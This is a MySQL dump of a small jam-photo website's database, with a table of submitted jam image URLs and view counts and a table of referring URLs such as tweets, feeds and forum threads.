-- MySQL dump 10.13  Distrib 5.5.30, for Linux (x86_64)
--
-- Host: localhost    Database: thisismyjam
-- ------------------------------------------------------
-- Server version	5.5.30-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `jams`
--

DROP TABLE IF EXISTS `jams`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jams` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `srcurl` varchar(255) NOT NULL,
  `filename` varchar(255) NOT NULL,
  `w` int(10) unsigned NOT NULL,
  `h` int(10) unsigned NOT NULL,
  `user` varchar(255) NOT NULL,
  `date_added` int(10) unsigned NOT NULL,
  `is_approved` tinyint(3) unsigned NOT NULL,
  `is_deleted` tinyint(3) unsigned NOT NULL,
  `views` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `user` (`user`,`is_deleted`,`date_added`),
  KEY `is_approved` (`is_approved`,`is_deleted`)
) ENGINE=InnoDB AUTO_INCREMENT=30 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jams`
--

LOCK TABLES `jams` WRITE;
/*!40000 ALTER TABLE `jams` DISABLE KEYS */;
INSERT INTO `jams` VALUES (1,'http://3.bp.blogspot.com/_RK-M45gBOMI/TEjZYc-DO0I/AAAAAAAABRQ/wr4GhRHXwZw/s1600/jam+July+087.JPG','jam3.jpg',600,450,'iamcal',0,1,0,3008);
INSERT INTO `jams` VALUES (2,'http://www.slowfoodhawaii.org/pics/081130/jam.jpg','jam4.jpg',600,430,'iamcal',0,1,0,2902);
INSERT INTO `jams` VALUES (3,'http://www.threedonia.com/wp-content/uploads/2008/10/toast-with-jam.jpg','jam5.jpg',538,600,'iamcal',0,1,0,3044);
INSERT INTO `jams` VALUES (4,'http://s158336089.onlinehome.us/OregonGrapeJam/OregonGrapeJamOnCracker.jpg','jam6.jpg',600,505,'iamcal',0,1,0,3029);
INSERT INTO `jams` VALUES (5,'http://3.bp.blogspot.com/-pENm9ptNF_0/Tq9Mxjh3JRI/AAAAAAAAD7A/8J3HMTN276g/s1600/Cranberry+Jam+01.jpg','jam7.jpg',400,600,'iamcal',0,1,0,2983);
INSERT INTO `jams` VALUES (6,'http://1.bp.blogspot.com/_DwvK-S-3Oqo/TBxzOA42MxI/AAAAAAAABpY/NiMVGTrUY7k/s1600/DSC07693cropE.jpg','jam8.jpg',600,563,'iamcal',0,1,0,3096);
INSERT INTO `jams` VALUES (7,'http://4.bp.blogspot.com/-bwV5QPmVe3s/TfWXpIrDoRI/AAAAAAAAB9A/0iZVOW-dsEk/s1600/Caramelized+apricot+jam.jpg','jam9.jpg',600,400,'iamcal',0,1,0,3074);
INSERT INTO `jams` VALUES (8,'http://richardson-farms.com/store/images/RICHARDSON-FARMS-OLD-FASHIONED-PEACH-JAM-18-OZ.jpg','jam10.jpg',600,567,'iamcal',0,1,0,3015);
INSERT INTO `jams` VALUES (9,'http://2.bp.blogspot.com/-UclLfvKNS8w/TfWXmU0PJII/AAAAAAAAB88/xrZuwzHh-KI/s1600/Caramelized+apricot+jam+in+spoon.jpg','jam11.jpg',600,400,'iamcal',0,1,0,2936);
INSERT INTO `jams` VALUES (10,'http://www.striplings.com/media/catalog/product/cache/1/image/9df78eab33525d08d6e5fb8d27136e95/s/t/strawberry-jam-10-oz_37.jpg','jam12.jpg',450,600,'iamcal',0,1,0,3065);
INSERT INTO `jams` VALUES (11,'http://images.mylot.com/userImages/images/postphotos/2353112.jpg','jam13.jpg',380,400,'iamcal',1322264593,1,0,3068);
INSERT INTO `jams` VALUES (12,'http://farm1.staticflickr.com/119/313470908_2c6c9ad1b4_b.jpg','jam16.jpg',600,450,'ph',1322282610,1,0,3104);
INSERT INTO `jams` VALUES (13,'http://farm3.staticflickr.com/2604/3844118237_a392009ca7_z.jpg','jam17.jpg',600,400,'BenWard',1322285215,1,0,3706);
INSERT INTO `jams` VALUES (14,'http://farm5.staticflickr.com/4094/4736673223_8ceb4577f3_b.jpg','jam18.jpg',448,600,'kentbrew',1322286296,1,0,3016);
INSERT INTO `jams` VALUES (15,'http://farm4.staticflickr.com/3550/3790879580_a5feec0bc8_o.jpg','jam19.jpg',600,450,'arielwaldman',1322287343,1,0,3089);
INSERT INTO `jams` VALUES (16,'http://www.blue-kitchen.com/wp-content/uploads/2008/09/bacon_marmalade_sandwich.jpg','jam20.jpg',432,350,'RodBegbie',1322350622,1,0,2896);
INSERT INTO `jams` VALUES (17,'http://www.corfusupplies.com/images/Bon%20Apricot.jpg','jam21.jpg',600,523,'iamcal',1322361283,1,0,2587);
INSERT INTO `jams` VALUES (18,'http://farm1.staticflickr.com/72/166718073_83f6230305_z.jpg','jam22.jpg',600,450,'revdancatt',1322406917,1,0,2858);
INSERT INTO `jams` VALUES (19,'http://distilleryimage11.instagram.com/974d6e44191c11e180c9123138016265_7.jpg','jam23.jpg',600,600,'jwheare',1322416032,1,0,2577);
INSERT INTO `jams` VALUES (20,'http://www.thejunket.com/wp-content/uploads/2011/04/frank-cooper.jpg','jam24.jpg',500,500,'deflatermouse',1323895243,1,0,2572);
INSERT INTO `jams` VALUES (21,'http://farm8.staticflickr.com/7143/6541012501_b97f615497_o_d.jpg','jam25.jpg',600,600,'kevinmarks',1324345125,1,0,3194);
INSERT INTO `jams` VALUES (22,'http://img.ajworld.net/spidey_ps3.jpg','jam27.jpg',408,600,'aj_187',1328843035,2,1,1);
INSERT INTO `jams` VALUES (23,'http://images.hhv.de/catalog/detail_big/00115/115228.jpg','jam28.jpg',600,600,'TTables',1330417577,1,0,2363);
INSERT INTO `jams` VALUES (24,'http://leakyslut.com/wp-content/uploads/2011/10/i-am-the-avalanche-avalanche-united-e1314644455140.jpg','jam30.jpg',500,500,'joe_schott',1332971079,2,1,1);
INSERT INTO `jams` VALUES (25,'http://www.outblush.com/women/images/2011/01/jme-raspberry-jam-lg.jpg','jam31.jpg',460,400,'bencochran',1333656195,1,0,2255);
INSERT INTO `jams` VALUES (26,'http://www.biography.com/imported/images/Biography/Images/Galleries/Pearl%20Jam/pearl-jam-3-sized.jpg','jam33.jpg',600,407,'bunch',1335555451,2,0,1);
INSERT INTO `jams` VALUES (27,'http://www.bbcgoodfood.com/recipes/2306/images/2306_MEDIUM.jpg','jam34.jpg',440,400,'bunch',1335555483,1,0,2109);
INSERT INTO `jams` VALUES (28,'http://www.beatmyday.com/wp-content/uploads/2011/06/Swedish-House-Mafia-Save-The-World-The-Remixes.jpg','jam35.jpg',500,500,'itschrisburton',1335904605,2,1,2);
INSERT INTO `jams` VALUES (29,'http://cdn.trendhunterstatic.com/thumbs/unicorn-poop-cookies.jpeg','jam36.jpg',600,473,'ojtwisted',1361125061,2,0,1);
/*!40000 ALTER TABLE `jams` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `refs`
--

DROP TABLE IF EXISTS `refs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `refs` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `url` varchar(255) NOT NULL,
  `jam_id` int(10) unsigned NOT NULL,
  `views` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `url` (`url`,`jam_id`)
) ENGINE=InnoDB AUTO_INCREMENT=1100 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `refs`
--

LOCK TABLES `refs` WRITE;
/*!40000 ALTER TABLE `refs` DISABLE KEYS */;
INSERT INTO `refs` VALUES (2,'http://www.iamcal.com/files/jam.htm',0,2);
INSERT INTO `refs` VALUES (3,'http://www.iamcal.com/files/jam.htm',1,2);
INSERT INTO `refs` VALUES (4,'http://t.co/ZXbGFSKY',0,283);
INSERT INTO `refs` VALUES (5,'https://twitter.com/iamcal/status/140291520724086784',0,49);
INSERT INTO `refs` VALUES (6,'http://iconfactory.com/twitterrific/#iPhone',0,6);
INSERT INTO `refs` VALUES (7,'http://stellar.io/grantbarrett/flow',0,1);
INSERT INTO `refs` VALUES (8,'http://stellar.io/shea/flow',0,1);
INSERT INTO `refs` VALUES (9,'http://stellar.io/gknauss/flow',0,1);
INSERT INTO `refs` VALUES (10,'http://stellar.io/mattbucher/flow',0,1);
INSERT INTO `refs` VALUES (11,'http://t.co/2UZn7Saa',13,80);
INSERT INTO `refs` VALUES (12,'https://twitter.com/benward/status/140301203551682560',13,20);
INSERT INTO `refs` VALUES (13,'http://stellar.io/aa/flow',0,1);
INSERT INTO `refs` VALUES (14,'http://www.google.com/',0,49);
INSERT INTO `refs` VALUES (15,'http://t.co/WpGSIcoI',0,85);
INSERT INTO `refs` VALUES (16,'https://twitter.com/tomcoates/status/140306499464470529',0,23);
INSERT INTO `refs` VALUES (17,'http://longurl.org',0,75);
INSERT INTO `refs` VALUES (18,'http://t.co/zgVZkahX',0,30);
INSERT INTO `refs` VALUES (19,'https://twitter.com/lexiphanic/status/140307905730723840',0,4);
INSERT INTO `refs` VALUES (20,'https://twitter.com/kyliemmason/status/140308110865727488',0,3);
INSERT INTO `refs` VALUES (21,'https://twitter.com/emckean/status/140307250144231426',0,7);
INSERT INTO `refs` VALUES (22,'https://twitter.com/blech/status/140308399337381888',13,6);
INSERT INTO `refs` VALUES (23,'http://pinboard.in/recent/before:1322284042',0,1);
INSERT INTO `refs` VALUES (24,'http://iconfactory.com/twitterrific/#iPhone',13,2);
INSERT INTO `refs` VALUES (25,'http://hootsuite.com/dashboard',0,5);
INSERT INTO `refs` VALUES (26,'http://stellar.io/gougelet/flow',0,1);
INSERT INTO `refs` VALUES (27,'http://stellar.io/anildash/flow/FMy3',0,1);
INSERT INTO `refs` VALUES (28,'http://www.google.com/',13,4);
INSERT INTO `refs` VALUES (29,'https://twitter.com/mattb_stellar/status/140310087804796928',13,3);
INSERT INTO `refs` VALUES (30,'http://whois.domaintools.com/thisismyj.am',0,128);
INSERT INTO `refs` VALUES (31,'http://stellar.io/paulr/flow',0,1);
INSERT INTO `refs` VALUES (32,'http://stellar.io/tomtaylor/flow',0,1);
INSERT INTO `refs` VALUES (33,'http://iconfactory.com/twitterrific/#iPad',0,5);
INSERT INTO `refs` VALUES (34,'https://twitter.com/ryangoodman/status/140367045538758656',0,2);
INSERT INTO `refs` VALUES (35,'http://twitter.com',0,19);
INSERT INTO `refs` VALUES (36,'http://t.co/NWx8mIV',0,1);
INSERT INTO `refs` VALUES (37,'http://t.co/q33IzlIl',0,14);
INSERT INTO `refs` VALUES (38,'http://humhum.be/music/74917.html?start=200',0,17);
INSERT INTO `refs` VALUES (39,'https://twitter.com/iamdanw/status/140373246854967296',0,4);
INSERT INTO `refs` VALUES (40,'https://twitter.com/jcoglan/status/140374902845865984',0,4);
INSERT INTO `refs` VALUES (41,'http://twitter.com',13,1);
INSERT INTO `refs` VALUES (42,'http://stellar.io/cheriles/flow',0,1);
INSERT INTO `refs` VALUES (43,'http://stellar.io/gribbly/flow',0,1);
INSERT INTO `refs` VALUES (44,'http://stellar.io/interesting-links',0,6);
INSERT INTO `refs` VALUES (45,'http://stellar.io/henpe/flow',0,1);
INSERT INTO `refs` VALUES (46,'http://stellar.io/mrjohnsly/flow',0,1);
INSERT INTO `refs` VALUES (47,'https://twitter.com/flaneur/status/140378319207153664',13,5);
INSERT INTO `refs` VALUES (48,'http://www.klektd.com/',13,1);
INSERT INTO `refs` VALUES (49,'http://stellar.io/adn/flow',0,1);
INSERT INTO `refs` VALUES (50,'http://stellar.io/ironicsans/flow',0,1);
INSERT INTO `refs` VALUES (51,'http://stellar.io/ambienttraffic/flow',0,1);
INSERT INTO `refs` VALUES (52,'http://pinboard.in/network/',0,3);
INSERT INTO `refs` VALUES (53,'https://twitter.com/ckelly/status/140318858484518913',0,1);
INSERT INTO `refs` VALUES (54,'http://stellar.io/jxmitchell/flow',0,2);
INSERT INTO `refs` VALUES (55,'http://stellar.io/zippyrocket/flow',0,1);
INSERT INTO `refs` VALUES (56,'http://stellar.io/mattblackwell/flow',0,1);
INSERT INTO `refs` VALUES (57,'http://stellar.io/hithro/flow',0,1);
INSERT INTO `refs` VALUES (58,'http://stellar.io/stml/flow',0,1);
INSERT INTO `refs` VALUES (59,'http://stellar.io/michelet/flow',0,1);
INSERT INTO `refs` VALUES (60,'http://stellar.io/ndurell/flow',0,2);
INSERT INTO `refs` VALUES (61,'http://stellar.io/sbug/flow',0,1);
INSERT INTO `refs` VALUES (62,'https://twitter.com/apgwoz/status/140415244492218369',0,4);
INSERT INTO `refs` VALUES (63,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8559',0,3);
INSERT INTO `refs` VALUES (64,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8557',0,8);
INSERT INTO `refs` VALUES (65,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8554',0,2);
INSERT INTO `refs` VALUES (66,'http://stellar.io/clayharris/flow/FoLv',0,1);
INSERT INTO `refs` VALUES (67,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8560',0,1);
INSERT INTO `refs` VALUES (68,'http://buffistas.org/showthread.php?thread_id=516&post_id=8557',0,1);
INSERT INTO `refs` VALUES (69,'http://stellar.io/ryanvlower/flow',0,1);
INSERT INTO `refs` VALUES (70,'http://t.co/5itZSzrZ',10,5);
INSERT INTO `refs` VALUES (71,'http://martinheike.de/reader/?what=unread',0,1);
INSERT INTO `refs` VALUES (72,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8536',0,1);
INSERT INTO `refs` VALUES (73,'http://stellar.io/bengrogan/flow',0,1);
INSERT INTO `refs` VALUES (74,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8532',0,1);
INSERT INTO `refs` VALUES (75,'http://alt.buffistas.net/showthread.php?thread_id=516&post_id=8553',0,1);
INSERT INTO `refs` VALUES (76,'http://buffistas.org/showthread.php?thread_id=516&post_id=8543',0,2);
INSERT INTO `refs` VALUES (77,'http://stellar.io/andreydashkov/flow',0,1);
INSERT INTO `refs` VALUES (78,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8549',0,1);
INSERT INTO `refs` VALUES (79,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8544',0,1);
INSERT INTO `refs` VALUES (80,'http://stellar.io/gabrielamadeus/flow/FoM1',0,1);
INSERT INTO `refs` VALUES (81,'http://stellar.io/dhgwilliam/flow/FomV',0,1);
INSERT INTO `refs` VALUES (82,'http://tweeteorites.com/',0,7);
INSERT INTO `refs` VALUES (83,'http://stellar.io/dannyb/flow',0,1);
INSERT INTO `refs` VALUES (84,'http://stellar.io/wes/flow',0,1);
INSERT INTO `refs` VALUES (85,'http://buffistas.org/showthread.php?thread_id=516&post_id=8559',0,1);
INSERT INTO `refs` VALUES (86,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8553',0,3);
INSERT INTO `refs` VALUES (87,'http://buffistas.org/showthread.php?thread_id=516&post_id=8525',0,1);
INSERT INTO `refs` VALUES (88,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8529',0,2);
INSERT INTO `refs` VALUES (89,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8541',0,1);
INSERT INTO `refs` VALUES (90,'http://yandex.ru/yandsearch?text=thisismyj.am',0,7);
INSERT INTO `refs` VALUES (91,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8545',0,1);
INSERT INTO `refs` VALUES (92,'http://stellar.io/jakevictor/flow',0,1);
INSERT INTO `refs` VALUES (93,'http://buffistas.org/showthread.php?thread_id=516&post_id=8551',0,3);
INSERT INTO `refs` VALUES (94,'https://twitter.com/commutrx/status/140352776935968768',0,1);
INSERT INTO `refs` VALUES (95,'http://stellar.io/rikchilvers/flow',0,1);
INSERT INTO `refs` VALUES (96,'http://stellar.io/jrhyley/flow/FoCT',0,1);
INSERT INTO `refs` VALUES (97,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8510',0,1);
INSERT INTO `refs` VALUES (98,'http://stellar.io/kenyee/flow/FomV',0,1);
INSERT INTO `refs` VALUES (99,'http://stellar.io/amy/flow/F1MM',0,1);
INSERT INTO `refs` VALUES (100,'http://stellar.io/zlopid/flow/FMTG',0,1);
INSERT INTO `refs` VALUES (101,'http://stellar.io/andre',0,1);
INSERT INTO `refs` VALUES (102,'http://t.co/7S7JzIK8',0,8);
INSERT INTO `refs` VALUES (103,'http://www.google.com/reader/view/',0,3);
INSERT INTO `refs` VALUES (104,'http://stellar.io/snid/flow/F1ta',0,1);
INSERT INTO `refs` VALUES (105,'http://ulysses.5cience.net/streams/user/jweston/',0,1);
INSERT INTO `refs` VALUES (106,'http://stellar.io/zachwood/flow',0,2);
INSERT INTO `refs` VALUES (107,'http://stellar.io/destroyer/flow/F1uV',0,1);
INSERT INTO `refs` VALUES (108,'http://stellar.io/mdcclv/flow/FofW',0,2);
INSERT INTO `refs` VALUES (109,'http://stellar.io/beauteague/flow',0,1);
INSERT INTO `refs` VALUES (110,'http://stellar.io/jdherg/flow/FoP3',0,1);
INSERT INTO `refs` VALUES (111,'http://stellar.io/alby/flow/Fosv',0,1);
INSERT INTO `refs` VALUES (112,'https://twitter.com/thisismyjam/status/140554450476601344',0,9);
INSERT INTO `refs` VALUES (113,'http://t.co/UdcUrufq',0,476);
INSERT INTO `refs` VALUES (114,'http://stellar.io/rfmarotti/flow/Foud',0,1);
INSERT INTO `refs` VALUES (115,'http://t.co/r2kihthu',0,1);
INSERT INTO `refs` VALUES (116,'https://twitter.com/andybudd/status/140558081644953601',0,41);
INSERT INTO `refs` VALUES (117,'https://twitter.com/pmjtweets/status/140558736493264896',0,1);
INSERT INTO `refs` VALUES (118,'http://t.co/rmdx2VjB',0,5);
INSERT INTO `refs` VALUES (119,'http://t.co/V1GpNJOw',0,37);
INSERT INTO `refs` VALUES (120,'https://twitter.com/lachlanhardy/status/140563020257574914',0,1);
INSERT INTO `refs` VALUES (121,'https://twitter.com/flaneur/status/140562458078224385',0,5);
INSERT INTO `refs` VALUES (122,'http://t.co/3J7zgrMA',0,1);
INSERT INTO `refs` VALUES (123,'http://t.co/ti2dW9JR',16,12);
INSERT INTO `refs` VALUES (124,'https://twitter.com/thisismyjam/status/140562377438527491',0,6);
INSERT INTO `refs` VALUES (125,'https://twitter.com/rodbegbie/status/140574878402232320',16,7);
INSERT INTO `refs` VALUES (126,'http://buffistas.org/showthread.php?thread_id=516&post_id=8555',0,3);
INSERT INTO `refs` VALUES (127,'http://stellar.io/jakeverlin/flow',0,1);
INSERT INTO `refs` VALUES (128,'http://groovymother.com/',16,5);
INSERT INTO `refs` VALUES (129,'https://twitter.com/rsquared/status/140579616225112064',0,3);
INSERT INTO `refs` VALUES (130,'https://twitter.com/rsquared/status/140580630315548672',13,5);
INSERT INTO `refs` VALUES (131,'https://twitter.com/matro/status/140560916486963200',0,3);
INSERT INTO `refs` VALUES (132,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8548',0,2);
INSERT INTO `refs` VALUES (133,'http://stellar.io/ian_db/flow',0,1);
INSERT INTO `refs` VALUES (134,'http://www.google.com/',16,4);
INSERT INTO `refs` VALUES (135,'http://stellar.io/tcshillingford/flow/FomV',0,1);
INSERT INTO `refs` VALUES (136,'http://stellar.io/kenarneson/flow/Fosh',0,1);
INSERT INTO `refs` VALUES (137,'http://stellar.io/tupton/flow/FoP3',0,1);
INSERT INTO `refs` VALUES (138,'http://longurl.org',16,1);
INSERT INTO `refs` VALUES (139,'http://stellar.io/gribbly/flow/FoP3',0,1);
INSERT INTO `refs` VALUES (140,'http://jetsli.de/crawler',16,1);
INSERT INTO `refs` VALUES (141,'https://twitter.com/lazlofruvous/status/140479440294649856',0,1);
INSERT INTO `refs` VALUES (142,'http://tweetedtimes.com/',0,5);
INSERT INTO `refs` VALUES (143,'http://t.co/UwXyLxjE',18,4);
INSERT INTO `refs` VALUES (144,'http://stellar.io/northerncomfort/flow/FoYj',0,1);
INSERT INTO `refs` VALUES (145,'http://news.google.com/',0,2);
INSERT INTO `refs` VALUES (146,'http://irc.tinyspeck.com/',0,1);
INSERT INTO `refs` VALUES (147,'http://stellar.io/jwheare/flow',13,1);
INSERT INTO `refs` VALUES (148,'http://stellar.io/stml/flow/F16R',0,1);
INSERT INTO `refs` VALUES (149,'http://t.co/sPHvrQHD',0,1);
INSERT INTO `refs` VALUES (150,'http://t.co/u6AfFbsv',0,4);
INSERT INTO `refs` VALUES (151,'https://twitter.com/revdancatt/status/140812060543029248',18,1);
INSERT INTO `refs` VALUES (152,'http://stellar.io/dnachman/flow/F1uV',0,1);
INSERT INTO `refs` VALUES (153,'http://pinboard.in/u:blech/network/before:1322334675',0,1);
INSERT INTO `refs` VALUES (154,'http://www.instapaper.com/u',0,1);
INSERT INTO `refs` VALUES (155,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8514',0,1);
INSERT INTO `refs` VALUES (156,'http://www.iamcal.com/',0,2);
INSERT INTO `refs` VALUES (157,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8547',0,2);
INSERT INTO `refs` VALUES (158,'http://stellar.io/interesting-links/Fozb',0,1);
INSERT INTO `refs` VALUES (159,'http://t.co/oy20Gcf',0,2);
INSERT INTO `refs` VALUES (160,'https://twitter.com/paulie/status/141307443501211649',0,1);
INSERT INTO `refs` VALUES (161,'http://t.co/RcDP1cj',0,1);
INSERT INTO `refs` VALUES (162,'http://t.co/zUkX869f',0,1);
INSERT INTO `refs` VALUES (163,'http://longurl.org',13,2);
INSERT INTO `refs` VALUES (164,'https://twitter.com/secretsquirrel/status/142310286223884289',0,2);
INSERT INTO `refs` VALUES (165,'http://t.co/KNy7BN8M',0,1);
INSERT INTO `refs` VALUES (166,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8526',0,1);
INSERT INTO `refs` VALUES (167,'http://t.co/z6haItn9',0,6);
INSERT INTO `refs` VALUES (168,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8525',0,2);
INSERT INTO `refs` VALUES (169,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8520',0,1);
INSERT INTO `refs` VALUES (170,'http://www.buffistas.org/showthread.php?thread_id=516&post_id=8551',0,1);
INSERT INTO `refs` VALUES (171,'http://t.co/i5aSKiY3',0,3);
INSERT INTO `refs` VALUES (172,'http://yandex.ru/yandsearch?text=In+via+Twitter+to',13,1);
INSERT INTO `refs` VALUES (173,'http://t.co/bCdYQtJb',0,5);
INSERT INTO `refs` VALUES (174,'http://t.co/RUbHJqbM',0,2);
INSERT INTO `refs` VALUES (175,'https://twitter.com/vitor_io/status/145222585523781632',0,1);
INSERT INTO `refs` VALUES (176,'http://yandex.ru/yandsearch?text=In+via+Twitter',10,1);
INSERT INTO `refs` VALUES (177,'http://t.co/1DOnWyeM',0,5);
INSERT INTO `refs` VALUES (178,'http://t.co/h89uf9ff',0,2);
INSERT INTO `refs` VALUES (179,'http://t.co/vBiMzUJW',0,13);
INSERT INTO `refs` VALUES (180,'http://t.co/vBiMzUJW??',0,6);
INSERT INTO `refs` VALUES (181,'http://thisismymarmala.de/',0,12);
INSERT INTO `refs` VALUES (182,'https://twitter.com/bhsdrew/status/146380886890397698',0,1);
INSERT INTO `refs` VALUES (183,'http://t.co/cbqsv48x',0,3);
INSERT INTO `refs` VALUES (184,'http://www.google.com/reader/view/?tab=my',0,1);
INSERT INTO `refs` VALUES (185,'http://t.co/ZlFTc7kd',0,2);
INSERT INTO `refs` VALUES (186,'http://t.co/s21ePW80',0,8);
INSERT INTO `refs` VALUES (187,'http://jetsli.de/crawler',0,2);
INSERT INTO `refs` VALUES (188,'http://yandex.ru/yandsearch?text=thisismyj.am',2,1);
INSERT INTO `refs` VALUES (189,'http://t.co/0N9xb1ay',13,8);
INSERT INTO `refs` VALUES (190,'http://m.dabr.co.uk/',13,1);
INSERT INTO `refs` VALUES (191,'http://twitter.com/',21,1);
INSERT INTO `refs` VALUES (192,'http://t.co/YChrAJl1',21,52);
INSERT INTO `refs` VALUES (193,'http://longurl.org',21,15);
INSERT INTO `refs` VALUES (194,'http://www.google.com/',21,2);
INSERT INTO `refs` VALUES (195,'https://twitter.com/kevinmarks/status/148940600320851968',21,1);
INSERT INTO `refs` VALUES (196,'http://news.google.com/',21,1);
INSERT INTO `refs` VALUES (197,'http://t.co/05lDjoeE',0,19);
INSERT INTO `refs` VALUES (198,'https://twitter.com/annapickard/status/149109774456324096',0,1);
INSERT INTO `refs` VALUES (199,'http://stellar.io/justinpickard/flow',0,1);
INSERT INTO `refs` VALUES (200,'http://jetsli.de/crawler',21,1);
INSERT INTO `refs` VALUES (201,'http://t.co/TxjOwVWw',0,10);
INSERT INTO `refs` VALUES (202,'https://twitter.com/mckelvie/status/149998990111408129',0,1);
INSERT INTO `refs` VALUES (203,'http://tweetlist.com/#2.9.0',0,1);
INSERT INTO `refs` VALUES (204,'http://yandex.ru/yandsearch?text=In+via+Twitter+to+upload+your',7,1);
INSERT INTO `refs` VALUES (205,'https://twitter.com/couch/status/150311664804298752',0,1);
INSERT INTO `refs` VALUES (206,'http://t.co/Ox3iSZvq',0,10);
INSERT INTO `refs` VALUES (207,'http://t.co/i7TY0yk8',0,2);
INSERT INTO `refs` VALUES (208,'http://uk.mc431.mail.yahoo.com/mc/welcome?.gx=1&.tm=1325217389&.rand=4lrngc814es4t',13,1);
INSERT INTO `refs` VALUES (209,'https://twitter.com/timharbour/status/155385364989747200',0,1);
INSERT INTO `refs` VALUES (210,'http://yandex.ru/yandsearch?text=thisismyj.am',5,1);
INSERT INTO `refs` VALUES (211,'http://domai.nr/',0,1);
INSERT INTO `refs` VALUES (212,'http://t.co/4Gam5GU',0,6);
INSERT INTO `refs` VALUES (213,'https://twitter.com/kevinmarks/status/157179961407574017',0,1);
INSERT INTO `refs` VALUES (214,'http://t.co/mqhBlfAS',0,8);
INSERT INTO `refs` VALUES (215,'http://t.co/Ln9yG9x',0,7);
INSERT INTO `refs` VALUES (216,'https://twitter.com/robcorr/status/157624204970303488',0,2);
INSERT INTO `refs` VALUES (217,'http://guide.opendns.com/main?url=thisismyj.com&tid=0&w=980&h=1275',7,1);
INSERT INTO `refs` VALUES (218,'http://t.co/1u6hbvLn',5,4);
INSERT INTO `refs` VALUES (219,'http://www.seoheap.com/?q=siteanalysis',0,1);
INSERT INTO `refs` VALUES (220,'http://t.co/5g8pUHG',0,2);
INSERT INTO `refs` VALUES (221,'http://t.co/cpm0kcOe',0,26);
INSERT INTO `refs` VALUES (222,'http://www.theroot42.org/thread/41955/1/868477',0,1);
INSERT INTO `refs` VALUES (223,'http://www.theroot42.org/thread/41955',0,12);
INSERT INTO `refs` VALUES (224,'http://t.co/FnFBZx3E',0,8);
INSERT INTO `refs` VALUES (225,'https://twitter.com/gb_r/status/163672772806066178',0,2);
INSERT INTO `refs` VALUES (226,'https://twitter.com/patrickhmason/status/165117739059511296',0,1);
INSERT INTO `refs` VALUES (227,'https://twitter.com/timharbour/status/167543079652442113',0,1);
INSERT INTO `refs` VALUES (228,'http://favstar.fm/users/micrypt/recent',13,1);
INSERT INTO `refs` VALUES (229,'http://trunk.ly/',12,1);
INSERT INTO `refs` VALUES (230,'https://twitter.com/atroche/status/167931838499794944',12,1);
INSERT INTO `refs` VALUES (231,'http://t.co/AeZhS7TY',12,1);
INSERT INTO `refs` VALUES (232,'https://twitter.com/patrickhmason/status/169060596627677185',0,25);
INSERT INTO `refs` VALUES (233,'https://twitter.com/thisismyjam/status/169175331570335745',0,4);
INSERT INTO `refs` VALUES (234,'http://www.netvibes.com/privatepage/1',0,1);
INSERT INTO `refs` VALUES (235,'https://twitter.com/flaneur/status/169175384166903808',0,4);
INSERT INTO `refs` VALUES (236,'http://t.co/HbcOr7Uv',0,2);
INSERT INTO `refs` VALUES (237,'http://stellar.io/ph/flow',0,1);
INSERT INTO `refs` VALUES (238,'https://twitter.com/invisiblea/status/169176963565625344',0,1);
INSERT INTO `refs` VALUES (239,'http://yandex.ru/yandsearch?text=In+via+Twitter+to+upload+your&lr=213',19,1);
INSERT INTO `refs` VALUES (240,'http://www.facebook.com/',0,27);
INSERT INTO `refs` VALUES (241,'http://www.facebook.com/?ref=logo',0,1);
INSERT INTO `refs` VALUES (242,'http://www.facebook.com/home.php',0,1);
INSERT INTO `refs` VALUES (243,'http://t.co/OO4siglX',0,10);
INSERT INTO `refs` VALUES (244,'https://twitter.com/bothersbar/status/170116269054500865',0,1);
INSERT INTO `refs` VALUES (245,'http://bothersbar.co.uk/',0,1);
INSERT INTO `refs` VALUES (246,'http://t.co/i0YSaw5i',0,2);
INSERT INTO `refs` VALUES (247,'https://twitter.com/understood/status/170455807744409600',0,1);
INSERT INTO `refs` VALUES (248,'http://t.co/xgssdDyV',0,5);
